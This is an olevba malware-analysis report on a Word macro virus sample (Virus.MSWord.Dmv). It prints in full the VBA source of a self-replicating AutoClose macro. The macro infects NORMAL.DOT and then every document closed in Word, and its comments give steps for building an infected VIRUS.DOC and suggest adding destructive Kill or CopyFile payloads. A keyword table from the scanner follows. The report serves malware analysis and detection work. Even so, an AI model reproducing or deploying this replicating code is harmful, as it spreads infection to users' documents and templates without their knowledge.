olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dmv-f13336a78244688a73efed8fba627022f736e7d8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dmv-f13336a78244688a73efed8fba627022f736e7d8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Dmv-f13336a78244688a73efed8fba627022f736e7d8 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem This demonstrates an application-specific document virus
Rem generated by an automatic macro in Microsoft Word 6.0.
Rem Code is executed each time a document is closed.  This
Rem macro is only a demonstration, and does not perform any
Rem destructive actions.

Rem The purpose of this code is to reveal a significant security
Rem risk in software that supports macro languages with
Rem auto-loading capabilities.  Current virus detection tools are
Rem currently not capable of detecting this type of virus, and
Rem most users are blissfully unaware that threats can come from
Rem documents.

Rem Paste this code in the macro Window of a Word document
Rem template.  Save the macro as AutoClose.  Enter some random
Rem text in the main word processing window and save the document.
Rem Now copy the file, naming the new file VIRUS.DOC.  Open
Rem VIRUS.DOC in Word.  It will appear as a normal document, but
Rem when you close the document, the virus will execute.

Rem Message boxes display progress as the code is executed.
Rem Code is commented.

Rem joelm@eskimo.com, December 17, 1994
Rem -----------------------------------------------
Public Sub MAIN()
Dim title$
Dim total
Dim present
Dim cycle
Dim a$
title$ = "Document Macro Virus"
WordBasic.MsgBox "Counting global macros.", title$, 16
Rem check how many macros are globally available.
total = WordBasic.CountMacros(0)
present = 0

Rem Check and see if the AutoClose macro is installed in global.
If total > 0 Then
    For cycle = 1 To total
        If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
        WordBasic.MsgBox "AutoClose macro virus is already installed in NORMAL.DOT.", title$, 16
            present = 1
        End If
'End If

Rem Get the current document name.
a$ = WordBasic.[WindowName$]() + ":AutoClose"

Rem If AutoClose isn't present, then copy it to NORMAL.DOT.
If present <> 1 Then
    WordBasic.MacroCopy a$, "Global:AutoClose"
    WordBasic.MsgBox "Infected NORMAL.DOT with copy of AutoClose macro virus.", title$, 16

Rem The following code infects a document each time it is closed.
Rem This effectively spreads the macro virus each time an infected
Rem document is opened by Word.

Else
    Rem If AutoClose is already global and the file hasn't been
    Rem infected yet, save the current file as a
    Rem template instead of a document so the macro can be
    Rem attached.

    Rem See if AutoClose is already in the document.  Don't need
    Rem to check names because the virus would be the only code
    Rem putting a macro in a document.

    present = 0
    If WordBasic.CountMacros(1) <> 0 Then
        WordBasic.MsgBox "AutoClose macro virus already present in this document.", title$, 16
        present = 1
    End If

    If present = 0 Then
        WordBasic.FileSaveAs Format:=1
        WordBasic.MsgBox "Saved current document as template.", title$, 16
    
        Rem Then copy the AutoClose macro from NORMAL.DOT.

        WordBasic.MacroCopy "Global:AutoClose", a$
        WordBasic.MsgBox "Infected current document with copy of AutoClose macro virus.", title$, 16
    End If
End If

Rem After the document or NORMAL.DOT has been infected, then
Rem execute the following macro code (this could be destructive,
Rem such as a Kill command, invasive, such as a Connect and
Rem CopyFile command, or harmless, with no malacious intent).

WordBasic.MsgBox "Macro virus has been spread.  Now execute some other code (good, bad, or indifferent).", title$, 16
Next
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Dmv-f13336a78244688a73efed8fba627022f736e7d8 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

